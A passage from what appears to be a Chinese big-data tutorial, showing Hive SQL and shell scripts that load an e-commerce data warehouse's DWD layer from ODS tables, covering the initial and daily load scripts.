${APP}.ods_order_detail_activity_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>“</p><p>dwd_trade_cart_add_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_cart_add_inc partition (dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic.dic_name,</p><p>sku_num,</p><p>date_format(create_time, ‘yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num</p><p>from ${APP}.ods_cart_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on ci.source_type=dic.dic_code;</p><p>“</p><p>dwd_trade_cart_full=”</p><p>insert overwrite table ${APP}.dwd_trade_cart_full partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>sku_name,</p><p>sku_num</p><p>from ${APP}.ods_cart_info_full</p><p>where dt=’$do_date’</p><p>and is_ordered=’0’;</p><p>“</p><p>dwd_trade_order_detail_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_order_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(create_time, ‘yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>“</p><p>dwd_trade_order_refund_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_order_refund_inc partition(dt)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code = ‘15’</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code = ‘13’</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><p>“</p><p>dwd_trade_pay_detail_suc_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_pay_detail_suc_inc partition (dt)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(callback_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ${APP}.ods_payment_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>and data.payment_status=’1602’</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’11’</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p>“</p><p>dwd_trade_refund_pay_suc_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_refund_pay_suc_inc partition(dt)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,’yyyy-MM-dd’) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount,</p><p>date_format(callback_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ${APP}.ods_refund_payment_inc</p><p>where dt=’$do_date’</p><p>and type = ‘bootstrap-insert’</p><p>and data.refund_status=’1602’</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’11’</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><p>“</p><p>dwd_traffic_action_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_action_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ${APP}.ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=’$do_date’</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_display_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_display_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.\`order\` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ${APP}.ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=’$do_date’</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_error_inc=”</p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table ${APP}.dwd_traffic_error_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and err is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>set hive.execution.engine=spark;</p><p>“</p><p>dwd_traffic_page_view_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_page_view_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) view_time,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_traffic_start_inc=”</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_start_inc partition(dt=’$do_date’)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and \`start\` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>dwd_user_login_inc=”</p><p>insert overwrite table ${APP}.dwd_user_login_inc partition(dt=’$do_date’)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts,’GMT+8’),’yyyy-MM-dd HH:mm:ss’) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,’-‘,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><p>“</p><p>dwd_user_register_inc=”</p><p>insert overwrite table ${APP}.dwd_user_register_inc partition(dt)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=’$do_date’</p><p>and type=’bootstrap-insert’</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ${APP}.ods_log_inc</p><p>where dt=’$do_date’</p><p>and page.page_id=’register’</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>“</p><p>case $1 in</p><p>“dwd_interaction_comment_inc” )</p><p>hive -e “$dwd_interaction_comment_inc”</p><p>;;</p><p>“dwd_interaction_favor_add_inc” )</p><p>hive -e “$dwd_interaction_favor_add_inc”</p><p>;;</p><p>“dwd_tool_coupon_get_inc” )</p><p>hive -e “$dwd_tool_coupon_get_inc”</p><p>;;</p><p>“dwd_tool_coupon_order_inc” )</p><p>hive -e “$dwd_tool_coupon_order_inc”</p><p>;;</p><p>“dwd_tool_coupon_pay_inc” )</p><p>hive -e “$dwd_tool_coupon_pay_inc”</p><p>;;</p><p>“dwd_trade_cancel_detail_inc” )</p><p>hive -e “$dwd_trade_cancel_detail_inc”</p><p>;;</p><p>“dwd_trade_cart_add_inc” )</p><p>hive -e “$dwd_trade_cart_add_inc”</p><p>;;</p><p>“dwd_trade_cart_full” )</p><p>hive -e “$dwd_trade_cart_full”</p><p>;;</p><p>“dwd_trade_order_detail_inc” )</p><p>hive -e “$dwd_trade_order_detail_inc”</p><p>;;</p><p>“dwd_trade_order_refund_inc” )</p><p>hive -e “$dwd_trade_order_refund_inc”</p><p>;;</p><p>“dwd_trade_pay_detail_suc_inc” )</p><p>hive -e “$dwd_trade_pay_detail_suc_inc”</p><p>;;</p><p>“dwd_trade_refund_pay_suc_inc” )</p><p>hive -e “$dwd_trade_refund_pay_suc_inc”</p><p>;;</p><p>“dwd_traffic_action_inc” )</p><p>hive -e “$dwd_traffic_action_inc”</p><p>;;</p><p>“dwd_traffic_display_inc” )</p><p>hive -e “$dwd_traffic_display_inc”</p><p>;;</p><p>“dwd_traffic_error_inc” )</p><p>hive -e “$dwd_traffic_error_inc”</p><p>;;</p><p>“dwd_traffic_page_view_inc” )</p><p>hive -e “$dwd_traffic_page_view_inc”</p><p>;;</p><p>“dwd_traffic_start_inc” )</p><p>hive -e “$dwd_traffic_start_inc”</p><p>;;</p><p>“dwd_user_login_inc” )</p><p>hive -e “$dwd_user_login_inc”</p><p>;;</p><p>“dwd_user_register_inc” )</p><p>hive -e “$dwd_user_register_inc”</p><p>;;</p><p>“all” )</p><p>hive -e<br>“$dwd_interaction_comment_inc$dwd_interaction_favor_add_inc$dwd_tool_coupon_get_inc$dwd_tool_coupon_order_inc$dwd_tool_coupon_pay_inc$dwd_trade_cancel_detail_inc$dwd_trade_cart_add_inc$dwd_trade_cart_full$dwd_trade_order_detail_inc$dwd_trade_order_refund_inc$dwd_trade_pay_detail_suc_inc$dwd_trade_refund_pay_suc_inc$dwd_traffic_action_inc$dwd_traffic_display_inc$dwd_traffic_error_inc$dwd_traffic_page_view_inc$dwd_traffic_start_inc$dwd_user_login_inc$dwd_user_register_inc”</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dwd_init.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ ods_to_dwd_init.sh all 2020-06-14</p><h4 id="每日装载脚本-1"><a href="#每日装载脚本-1" class="headerlink" title="每日装载脚本"></a>每日装载脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建ods_to_dwd.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dwd.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>dwd_interaction_comment_inc=”</p><p>insert overwrite table ${APP}.dwd_interaction_comment_inc<br>partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>order_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>appraise,</p><p>dic_name</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.order_id,</p><p>data.create_time,</p><p>data.appraise</p><p>from ${APP}.ods_comment_info_inc</p><p>where dt=’$do_date’</p><p>and type=’insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’12’</p><p>)dic</p><p>on ci.appraise=dic.dic_code;</p><p>“</p><p>dwd_interaction_favor_add_inc=”</p><p>insert overwrite table ${APP}.dwd_interaction_favor_add_inc<br>partition(dt=’$do_date’)</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(data.create_time,’yyyy-MM-dd’) date_id,</p><p>data.create_time</p><p>from ${APP}.ods_favor_info_inc</p><p>where dt=’$do_date’</p><p>and type = ‘insert’;</p><p>“</p><p>dwd_tool_coupon_get_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_get_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>date_format(data.get_time,’yyyy-MM-dd’) date_id,</p><p>data.get_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’insert’;</p><p>“</p><p>dwd_tool_coupon_order_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_order_inc<br>partition(dt=’$do_date’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.using_time,’yyyy-MM-dd’) date_id,</p><p>data.using_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’using_time’);</p><p>“</p><p>dwd_tool_coupon_pay_inc=”</p><p>insert overwrite table ${APP}.dwd_tool_coupon_pay_inc partition(dt=’$do_date’)</p><p>select</p><p>data.id,</p><p>data.coupon_id,</p><p>data.user_id,</p><p>data.order_id,</p><p>date_format(data.used_time,’yyyy-MM-dd’) date_id,</p><p>data.used_time</p><p>from ${APP}.ods_coupon_use_inc</p><p>where dt=’$do_date’</p><p>and type=’update’</p><p>and array_contains(map_keys(old),’used_time’);</p><p>“</p><p>dwd_trade_cancel_detail_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_cancel_detail_inc partition<br>(dt=’$do_date’)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,’yyyy-MM-dd’) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where (dt=’$do_date’ or dt=date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ${APP}.ods_order_info_inc</p><p>where dt = ‘$do_date’</p><p>and type = ‘update’</p><p>and data.order_status=’1003’</p><p>and array_contains(map_keys(old),’order_status’)</p><p>) oi</p><p>on order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where (dt=’$do_date’ or dt=date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where (dt=’$do_date’ or dt=date_add(‘$do_date’,-1))</p><p>and (type = ‘insert’ or type= ‘bootstrap-insert’)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>“</p><p>dwd_trade_cart_add_inc=”</p><p>insert overwrite table ${APP}.dwd_trade_cart_add_inc 